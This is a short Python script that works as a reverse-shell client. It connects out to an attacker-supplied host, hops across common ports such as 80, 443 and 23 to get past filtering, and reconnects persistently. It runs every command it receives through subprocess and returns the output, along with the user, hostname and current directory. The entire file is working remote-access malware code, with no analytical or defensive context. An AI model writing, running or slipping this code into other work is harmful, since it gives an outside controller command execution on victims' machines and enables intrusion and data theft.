import socket
import subprocess
import sys
import time
import os

HOST = sys.argv[1]
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

HOP_STRING = "porthop"
INFO_QUERY = "informationquery"

def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]
	

def getInfo():
	user = subprocess.getoutput("whoami")
	host = subprocess.getoutput("hostname")
	curdir = os.getcwd()
	return user + "@" + host + ":" + curdir + "$ "


open_conn = False
while True:
	try:
		if not open_conn:
			s = socket.socket()
			s.settimeout(10)
			print("Trying to connect")
			s.connect((HOST, PORT))
			PORT = nextPort(PORT)
			print("Connected")
			open_conn = True
			
		cmd = s.recv(BUFFER).decode()
		
		if cmd == HOP_STRING:
			open_conn = False
			s.close()
			time.sleep(1)
		else:
			if cmd == INFO_QUERY:
				rsp = getInfo()
			elif "cd" in cmd:
				try:
					os.chdir(cmd[3::])
					rsp = "informationquery" + getInfo()
				except:
					rsp = "No such directory"
			else:
				rsp = subprocess.getoutput(cmd)
			s.send(rsp.encode())
	except Exception as e:
		open_conn = False
		time.sleep(5)
